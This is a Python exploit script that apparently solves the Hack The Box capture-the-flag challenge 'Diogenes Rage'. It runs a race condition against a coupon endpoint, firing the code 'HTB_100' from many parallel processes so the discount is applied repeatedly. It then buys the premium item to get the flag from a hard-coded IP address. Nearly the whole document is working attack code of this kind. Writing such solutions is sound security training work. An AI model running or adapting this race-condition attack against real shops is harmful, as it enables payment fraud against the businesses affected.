# Diogenes Rage

# Vulnerability:
# We can cause a race condition due to the usage of `async` in JavaScript


# APIs
## Post
# /api/purchase - I need to purchase C8 which costs $13.37 to print the flag. 
# /api/coupons/apply

## Get
# /api/reset - Resetting the session cookies

import multiprocessing
import requests
import time
import sys

def getSession(url):
    data = {
        "item":"C7"
    }

    r = requests.post(url + "/api/purchase", json=data)

    return r.cookies['session']    

def getFlag(url, token):
    cookies = {
        'session': token
    }

    data = {
        "item":"A3"
    }

    data2 = {
        "item":"C8"
    }

    r = requests.post(url + "/api/purchase", cookies=cookies, json=data)
    print(r.status_code)
    print(r.text)
    r = requests.post(url + "/api/purchase", cookies=cookies, json=data2)
    print(r.status_code)
    print(r.text)
    if 'flag' in r.text:
        print(r.text)
        sys.exit()

def post_url(url, data, cookies):
    for i in range(10):
        requests.post(url, data=data, cookies=cookies)

def getCoupon(url, token):
    url = url + "/api/coupons/apply"

    data = {
        "coupon_code":"HTB_100"
    }

    cookies = {
        'session': token
    }

    procs = []
    for i in range(12):
        procs.append(multiprocessing.Process(target=post_url, args=(url, data, cookies)))
    for proc in procs:
        proc.start()        
    # Complete the process
    for proc in procs:
        proc.join()

if __name__ == '__main__':
    for i in range(50):
        print(f"Attempt {i}...")
        url = "http://206.189.125.243:30140"
        token = getSession(url)            
        getCoupon(url, token)
        getFlag(url, token)
        time.sleep(1)

    
    


